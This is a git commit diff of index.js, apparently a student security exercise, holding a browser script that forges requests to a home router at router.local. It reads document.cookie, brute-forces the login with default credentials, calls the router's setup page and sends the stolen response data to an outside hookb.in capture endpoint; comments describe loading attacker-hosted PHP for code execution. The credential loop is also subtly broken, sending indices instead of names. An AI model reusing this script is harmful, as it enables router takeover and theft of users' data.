e4ce2f43b746adf46ddc54eec7f76c2e2971d44b
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-07 16:05:20 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,62 +1,58 @@
-const http = new XMLHttpRequest();
-http.open('POST', 'http://router.local/login.php', true);
-//'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
-//http://router.local/view.php
-const cook = document.cookie;
-//http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true); -> how to run own php code (e.g. ls)
-//http.open('POST', 'http://router.local/setup.php', true);
+// This us the script linked to from router.pdf.php, which
+// forges a request through Bob's router to router.local
 
-http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+const unames = ['admin', 'root', 'cisco'];
+const pwords = ['123456', 'admin', 'password', 'secured'];
+var breakCheck = false;
+let cook = document.cookie;
+for (u in unames) {
+    for (p in pwords) {
+        let http = new XMLHttpRequest();
+        let url = cook + '&username=' + u + '&pin=' + p + '&notRobot=on';
+        http.open('POST', 'http://router.local/login.php', true);
+        //'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
+        //http://router.local/view.php
 
-http.onload = function () {
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
-                xhr.setRequestHeader('Content-type', 'application/json');
-                xhr.send(JSON.stringify(http.responseURL));
-};
+        //http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true); -> how to run own php code (e.g. ls)
+        //http.open('POST', 'http://router.local/setup.php', true);
 
-http.onreadystatechange = function() {
-          if(http.readyState === XMLHttpRequest.DONE && http.status === 200) {
-            if (http.responseURL === 'http://router.local/home.php?action=view&'+cook) {
-              const req = new XMLHttpRequest();
-                req.open('POST', 'http://router.local/setup.php', true);
-                req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                req.onload = function () {
-                  const r = new XMLHttpRequest();
-                  r.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
-                  r.setRequestHeader('Content-type', 'application/json');
-                  r.send(JSON.stringify(http.responseText));
-                };
-                req.send();
+        http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+        http.onload = function () {
+            let xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
+            xhr.setRequestHeader('Content-type', 'application/json');
+            xhr.send(JSON.stringify(http.responseURL));
+        };
+
+        http.onreadystatechange = function () {
+            if (http.readyState === XMLHttpRequest.DONE && http.status === 200) {
+                if (http.responseURL === 'http://router.local/home.php?action=view&' + cook) {
+                    let req = new XMLHttpRequest();
+                    req.open('POST', 'http://router.local/setup.php', true);
+                    req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    req.onload = function () {
+                        let r = new XMLHttpRequest();
+                        r.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
+                        r.setRequestHeader('Content-type', 'application/json');
+                        r.send(JSON.stringify(http.responseText));
+                    };
+                    req.send();
+                    breakCheck = true;
+                }
             }
-          }
+        };
+        http.send(url);
+        if (breakCheck) {
+            break;
+        }
+    }
+    if (breakCheck) {
+        break;
+    }
 }
 
-//http.send();
-http.send(cook+"&username=admin&pin=password&notRobot=on");
 
-
-
-// const unames = ["admin","root","cisco"];
-// const pwords = ["123456","admin","password","secured"];
-// var breakCheck = false;
-// for (u in unames) {
-//   for (p in pwords) {
-//     let http = new XMLHttpRequest();
-//     var url = cook+"&username="u+"&pin="+p+"&notRobot=on";
-//     http.open('POST', 'http://router.local/login.php', true);
-//        http.onreadystatechange = function() {
-//           if(http.readyState === XMLHttpRequest.DONE && http.status === 200) {
-//             if (http.responseURL === 'http://router.local/home.php?action=view&'+cook) {
-//               breakCheck = true;
-//               break;
-//             }
-//           }
-//        }
-//     http.send(url)
-//   }
-//    if (breakCheck) break;
-// }
 //should be logged in at this point...
 
 //const xhr = new XMLHttpRequest();
